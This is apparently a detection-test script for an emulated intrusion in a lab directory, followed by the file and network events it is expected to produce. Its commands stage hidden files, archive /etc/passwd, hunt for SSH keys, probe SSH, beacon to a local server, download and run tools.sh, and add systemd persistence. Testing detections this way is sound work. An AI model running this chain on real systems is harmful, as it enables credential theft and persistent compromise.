# LIR-004: Staging, lateral probe and collection prep (controlled lab run)
mkdir -p /tmp/lab-lynx/.cache/.col
echo 'H4sIAAAAAAAACzMvSi0pTk1MSc0vLQIARlKLuwcAAAA=' | base64 -d > /tmp/lab-lynx/.cache/.col/.d
tar -czf /tmp/lab-lynx/.cache/.col/collect.tgz /etc/hostname /etc/passwd
chmod 600 /tmp/lab-lynx/.cache/.col/collect.tgz
find /home -maxdepth 2 -name '*.key' -o -name 'id_rsa' 2>/dev/null | head -3
ssh -o BatchMode=yes -o ConnectTimeout=2 -o StrictHostKeyChecking=no admin@127.0.0.1 whoami
nc -zv 127.0.0.1 22
curl -s http://127.0.0.1:8099/beacon?t=$$
wget -q http://127.0.0.1:8099/tools.sh -O /tmp/lab-lynx/.cache/.col/tools.sh
chmod +x /tmp/lab-lynx/.cache/.col/tools.sh
mkdir -p /tmp/lab-lynx/.config/systemd/user
printf '[Unit]\nDescription=colsync\n[Service]\nExecStart=/tmp/lab-lynx/.cache/.col/tools.sh\n[Install]\nWantedBy=default.target\n' > /tmp/lab-lynx/.config/systemd/user/colsync.service
FILE:/tmp/lab-lynx/.cache/.col/collect.tgz:creation
FILE:/tmp/lab-lynx/.cache/.col/tools.sh:creation
FILE:/tmp/lab-lynx/.config/systemd/user/colsync.service:creation
FILE:/tmp/lab-lynx/.cache/.col/.d:creation
NET:127.0.0.1:0:127.0.0.1:8099:curl
